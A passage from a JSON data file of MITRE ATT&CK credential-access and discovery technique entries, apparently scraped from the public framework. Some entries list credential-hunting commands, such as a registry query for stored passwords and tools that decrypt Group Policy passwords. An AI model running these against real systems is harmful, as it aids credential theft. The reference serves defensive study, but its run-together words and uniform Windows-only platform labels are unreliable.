    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Steal or Forge Kerberos Tickets",
    "parent_technique_id": "T1558",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:17:03.327835"
  },
  {
    "technique_id": "T1558.004",
    "name": "AS-REP Roasting",
    "description": "Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication byPassword CrackingKerberos messages.[1]Preauthentication offers protection against offlinePassword Cracking. When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the userâ€™s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the userâ€™s password.[2]For each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offlinePassword Crackingattacks similarly toKerberoastingand expose plaintext credentials.[1][3]An account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools likePowerShellwith an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data.[1][3]Cracked hashes may enablePersistence,Privilege Escalation, andLateral Movementvia access toValid Accounts.[4]",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Steal or Forge Kerberos Tickets",
    "parent_technique_id": "T1558",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:17:06.688616"
  },
  {
    "technique_id": "T1539",
    "name": "Steal Web Session Cookie",
    "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.Cookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.[1]There are several examples of malware targeting cookies from web browsers on the local system.[2][3]Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying onUser Executionby tricking victims into running malicious JavaScript in their browser.[4][5]There are also open source frameworks such asEvilginx2andMuraenathat can gather session cookies through a malicious proxy (e.g.,Adversary-in-the-Middle) that can be set up by an adversary and used in phishing campaigns.[6][7]After an adversary acquires a valid cookie, they can then perform aWeb Session Cookietechnique to login to the corresponding web application.",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:17:10.073192",
    "subtechniques": []
  },
  {
    "technique_id": "T1552",
    "name": "Unsecured Credentials",
    "description": "Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g.Bash History), operating system or application-specific repositories (e.g.Credentials in Registry),  or other specialized files/artifacts (e.g.Private Keys).[1]",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:17:13.450867",
    "subtechniques": [
      {
        "id": "T1552.001",
        "name": "Credentials In Files"
      },
      {
        "id": "T1552.002",
        "name": "Credentials in Registry"
      },
      {
        "id": "T1552.004",
        "name": "Private Keys"
      },
      {
        "id": "T1552.006",
        "name": "Group Policy Preferences"
      }
    ]
  },
  {
    "technique_id": "T1552.001",
    "name": "Credentials In Files",
    "description": "Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.It is possible to extract passwords from backups or saved virtual machines throughOS Credential Dumping.[1]Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller.[2]In cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.[3]They may also be found as parameters to deployment commands in container logs.[4]In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.[5]",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Unsecured Credentials",
    "parent_technique_id": "T1552",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:17:16.830739"
  },
  {
    "technique_id": "T1552.002",
    "name": "Credentials in Registry",
    "description": "Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.Example commands to find Registry keys related to password information:[1]Local Machine Hive:reg query HKLM /f password /t REG_SZ /sCurrent User Hive:reg query HKCU /f password /t REG_SZ /s",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Unsecured Credentials",
    "parent_technique_id": "T1552",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:17:20.163661"
  },
  {
    "technique_id": "T1552.004",
    "name": "Private Keys",
    "description": "Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.[1]Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc.Adversaries may also look in common key directories, such as~/.sshfor SSH keys on * nix-based systems orC:\\Users\\(username)\\.ssh\\on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates.[2][3]When a device is registered to Entra ID, a device key and a transport key are generated and used to verify the deviceâ€™s identity.[4]An adversary with access to the device may be able to export the keys in order to impersonate the device.[5]On network devices, private keys may be exported viaNetwork Device CLIcommands such ascrypto pki export.[6]Some private keys require a password or passphrase for operation, so an adversary may also useInput Capturefor keylogging or attempt toBrute Forcethe passphrase off-line. These private keys can be used to authenticate toRemote Serviceslike SSH or for use in decrypting other collected files such as email.",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Unsecured Credentials",
    "parent_technique_id": "T1552",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:17:23.558866"
  },
  {
    "technique_id": "T1552.006",
    "name": "Group Policy Preferences",
    "description": "Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.[1]These group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).[2]The following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:Metasploitâ€™s post exploitation module:post/windows/gather/credentials/gppGet-GPPPassword[3]gpprefdecrypt.pyOn the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files:dir /s * .xml",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Unsecured Credentials",
    "parent_technique_id": "T1552",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:17:26.922749"
  },
  {
    "technique_id": "T1087",
    "name": "Account Discovery",
    "description": "Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g.,Valid Accounts).Adversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.For examples, cloud environments typically provide easily accessible interfaces to obtain user lists.[1][2]On hosts, adversaries can use defaultPowerShelland other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected systemâ€™s files.",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:17:30.279365",
    "subtechniques": [
      {
        "id": "T1087.001",
        "name": "Local Account"
      },
      {
        "id": "T1087.002",
        "name": "Domain Account"
      },
      {
        "id": "T1087.003",
        "name": "Email Account"
      }
    ]
  },
  {
    "technique_id": "T1087.001",
    "name": "Local Account",
    "description": "Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.Commands such asnet userandnet localgroupof theNetutility andidandgroupson macOS and Linux can list local users and groups.[1][2][3]On Linux, local users can also be enumerated through the use of the/etc/passwdfile. On macOS, thedscl . list /Userscommand can be used to enumerate local accounts. On ESXi servers, theesxcli system account listcommand can list local user accounts.[4]",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Account Discovery",
    "parent_technique_id": "T1087",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:17:33.665716"
  },
  {
    "technique_id": "T1087.002",
    "name": "Domain Account",
    "description": "Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior such as targeting specific accounts which possess particular privileges.Commands such asnet user /domainandnet group /domainof theNetutility,dscacheutil -q groupon macOS, andldapsearchon Linux can list domain users and groups.PowerShellcmdlets includingGet-ADUserandGet-ADGroupMembermay enumerate members of Active Directory groups.[1]",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Account Discovery",
    "parent_technique_id": "T1087",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:17:37.080464"
  },
  {
    "technique_id": "T1087.003",
    "name": "Email Account",
    "description": "Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).[1]In on-premises Exchange and Exchange Online, theGet-GlobalAddressListPowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.[2][3]In Google Workspace, the GAL is shared with Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook (GWSMO) service. Additionally, the Google Workspace Directory allows for users to get a listing of other users within the organization.[4]",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Account Discovery",
    "parent_technique_id": "T1087",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:17:40.419143"
  },
  {
    "technique_id": "T1010",
    "name": "Application Window Discovery",
    "description": "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used.[1]For example, information about application windows could be used identify potential data to collect as well as identifying security tooling (Security Software Discovery) to evade.[2]Adversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such asCommand and Scripting Interpretercommands andNative APIfunctions.",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:17:43.793091",
    "subtechniques": []
  },
  {
    "technique_id": "T1217",
    "name": "Browser Information Discovery",
    "description": "Adversaries may enumerate information about browsers to learn more about compromised environments. Data saved by browsers (such as bookmarks, accounts, and browsing history) may reveal a variety of personal information about users (e.g., banking sites, relationships/interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.[1]Browser information may also highlight additional targets after an adversary has access to valid credentials, especiallyCredentials In Filesassociated with logins cached by a browser.Specific storage locations vary based on platform and/or application, but browser information is typically stored in local files and databases (e.g.,%APPDATA%/Google/Chrome).[2]",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:17:47.153446",
    "subtechniques": []
  },
  {
    "technique_id": "T1622",
    "name": "Debugger Evasion",
    "description": "Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.[1]Debugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar toVirtualization/Sandbox Evasion, if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads.Specific checks will vary based on the target and/or adversary. On Windows, this may involveNative APIfunction calls such asIsDebuggerPresent()andNtQueryInformationProcess(), or manually checking theBeingDebuggedflag of the Process Environment Block (PEB). On Linux, this may involve querying/proc/self/statusfor theTracerPIDfield, which indicates whether or not the process is being traced by dynamic analysis tools.[2][3]Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would \"swallow\" or handle the potential error).[4][5][6]Malware may also leverage Structured Exception Handling (SEH) to detect debuggers by throwing an exception and detecting whether the process is suspended. SEH handles both hardware and software expectations, providing control over the exceptions including support for debugging. If a debugger is present, the programâ€™s control will be transferred to the debugger, and the execution of the code will be suspended. If the debugger is not present, control will be transferred to the SEH handler, which will automatically handle the exception and allow the programâ€™s execution to continue.[7]Adversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by loopingNative APIfunction calls such asOutputDebugStringW().[8][9]",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:17:50.527137",
    "subtechniques": []
  },
  {
    "technique_id": "T1652",
    "name": "Device Driver Discovery",
    "description": "Adversaries may attempt to enumerate local device drivers on a victim host. Information about device drivers may highlight various insights that shape follow-on behaviors, such as the function/purpose of the host, present security tools (i.e.Security Software Discovery) or other defenses (e.g.,Virtualization/Sandbox Evasion), as well as potential exploitable vulnerabilities (e.g.,Exploitation for Privilege Escalation).Many OS utilities may provide information about local device drivers, such asdriverquery.exeand theEnumDeviceDrivers()API function on Windows.[1][2]Information about device drivers (as well as associated services, i.e.,System Service Discovery) may also be available in the Registry.[3]On Linux/macOS, device drivers (in the form of kernel modules) may be visible within/devor using utilities such aslsmodandmodinfo.[4][5][6]",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:17:53.877673",
    "subtechniques": []
  },
  {
    "technique_id": "T1482",
    "name": "Domain Trust Discovery",
    "description": "Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.[1]Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conductSID-History Injection,Pass the Ticket, andKerberoasting.[2][3]Domain trusts can be enumerated using theDSEnumerateDomainTrusts()Win32 API call, .NET methods, and LDAP.[3]The Windows utilityNltestis known to be used by adversaries to enumerate domain trusts.[4]",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:17:57.293504",
    "subtechniques": []
  },
  {
    "technique_id": "T1083",
    "name": "File and Directory Discovery",
    "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information fromFile and Directory Discoveryduring automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Many command shell utilities can be used to obtain this information. Examples includedir,tree,ls,find, andlocate.[1]Custom tools may also be used to gather file and directory information and interact with theNative API. Adversaries may also leverage aNetwork Device CLIon network devices to gather file and directory information (e.g.dir,show flash, and/ornvram).[2]Some files and directories may require elevated or specific user permissions to access.",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:18:00.785392",
    "subtechniques": []
  },
  {
    "technique_id": "T1615",
    "name": "Group Policy Discovery",
    "description": "Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predictable network path\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\.[1][2]Adversaries may use commands such asgpresultor various publicly available PowerShell functions, such asGet-DomainGPOandGet-DomainGPOLocalGroup, to gather information on Group Policy settings.[3][4]Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e.Domain or Tenant Policy Modification) for their benefit.",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:18:04.152086",
    "subtechniques": []
  },
  {
    "technique_id": "T1654",
    "name": "Log Enumeration",
    "description": "Adversaries may enumerate system and service logs to find useful data. These logs may highlight various types of valuable insights for an adversary, such as user authentication records (Account Discovery), security or vulnerable software (Software Discovery), or hosts within a compromised network (Remote System Discovery).Host binaries may be leveraged to collect system logs. Examples include usingwevtutil.exeorPowerShellon Windows to access and/or export security event information.[1][2]In cloud environments, adversaries may leverage utilities such as the Azure VM Agentâ€™sCollectGuestLogs.exeto collect security logs from cloud hosted infrastructure.[3]Adversaries may also target centralized logging infrastructure such as SIEMs. Logs may also be bulk exported and sent to adversary-controlled infrastructure for offline analysis.In addition to gaining a better understanding of the environment, adversaries may also monitor logs in real time to track incident response procedures. This may allow them to adjust their techniques in order to maintain persistence or evade defenses.[4]",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:18:07.506749",
    "subtechniques": []
  },
  {
    "technique_id": "T1046",
    "name": "Network Service Discovery",
    "description": "Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port, vulnerability, and/or wordlist scans using tools that are brought onto a system.[1]Within cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.Within macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a hostâ€™s registered services on the network. For example, adversaries can use a mDNS query (such asdns-sd -B _ssh._tcp .) to find other systems broadcasting the ssh service.[2][3]",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:18:10.916078",
    "subtechniques": []
  },
  {
    "technique_id": "T1135",
    "name": "Network Share Discovery",
    "description": "Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network.File sharing over a Windows network occurs over the SMB protocol.[1][2]Netcan be used to query a remote system for available shared drives using thenet view \\\\remotesystemcommand. It can also be used to query shared drives on the local system usingnet share. For macOS, thesharing -lcommand lists all shared points used for smb services.",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:18:14.285746",
    "subtechniques": []
  },
  {
    "technique_id": "T1040",
    "name": "Network Sniffing",
    "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such asLLMNR/NBT-NS Poisoning and SMB Relay, can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.Network sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequentLateral Movementand/orDefense Evasionactivities. Adversaries may likely also utilize network sniffing duringAdversary-in-the-Middle(AiTM) to passively gain additional knowledge about the environment.In cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.[1][2][3]Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.[4][5]The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.[4]On network devices, adversaries may perform network captures usingNetwork Device CLIcommands such asmonitor capture.[6][7]",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:18:17.581864",
    "subtechniques": []
  },
  {
    "technique_id": "T1201",
    "name": "Password Policy Discovery",
    "description": "Adversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. Password policies are a way to enforce complex passwords that are difficult to guess or crack throughBrute Force. This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).Password policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such asnet accounts (/domain),Get-ADDefaultDomainPasswordPolicy,chage -l,cat /etc/pam.d/common-password, andpwpolicy getaccountpolicies[1][2]. Adversaries may also leverage aNetwork Device CLIon network devices to discover password policy information (e.g.show aaa,show aaa common-criteria policy all).[3]Password policies can be discovered in cloud environments using available APIs such asGetAccountPasswordPolicyin AWS[4].",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:18:20.926748",
    "subtechniques": []
  },
  {
    "technique_id": "T1120",
    "name": "Peripheral Device Discovery",
    "description": "Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system.[1][2]Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:18:24.428112",
    "subtechniques": []
  },
  {
    "technique_id": "T1069",
    "name": "Permission Groups Discovery",
    "description": "Adversaries may attempt to discover group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.Adversaries may attempt to discover group permission settings in many different ways. This data may provide the adversary with information about the compromised environment that can be used in follow-on activity and targeting.[1]",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:18:27.784638",
    "subtechniques": [
      {
        "id": "T1069.001",
        "name": "Local Groups"
      },
      {
        "id": "T1069.002",
        "name": "Domain Groups"
      }
    ]
  },
  {
    "technique_id": "T1069.001",
    "name": "Local Groups",
    "description": "Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.Commands such asnet localgroupof theNetutility,dscl . -list /Groupson macOS, andgroupson Linux can list local groups.",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Permission Groups Discovery",
    "parent_technique_id": "T1069",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:18:31.215822"
  },
  {
    "technique_id": "T1069.002",
    "name": "Domain Groups",
    "description": "Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.Commands such asnet group /domainof theNetutility,dscacheutil -q groupon macOS, andldapsearchon Linux can list domain-level groups.",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Permission Groups Discovery",
    "parent_technique_id": "T1069",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:18:34.592045"
  },
  {
    "technique_id": "T1057",
    "name": "Process Discovery",
    "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information fromProcess Discoveryduring automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.In Windows environments, adversaries could obtain details on running processes using theTasklistutility viacmdorGet-ProcessviaPowerShell. Information about processes can also be extracted from the output ofNative APIcalls such asCreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with thepscommand. Adversaries may also opt to enumerate processes via/proc. ESXi also supports use of thepscommand, as well asesxcli system process list.[1][2]On network devices,Network Device CLIcommands such asshow processescan be used to display current running processes.[3][4]",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:18:38.103836",
    "subtechniques": []
  },
  {
    "technique_id": "T1012",
    "name": "Query Registry",
    "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.The Registry contains a significant amount of information about the operating system, configuration, software, and security.[1]Information can easily be queried using theRegutility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information fromQuery Registryduring automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
    "tactic": "Discovery",
    "tactics": [
      "Discovery"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:18:41.567992",
    "subtechniques": []
  },
  {
    "technique_id": "T1018",
    "name": "Remote System Discovery",
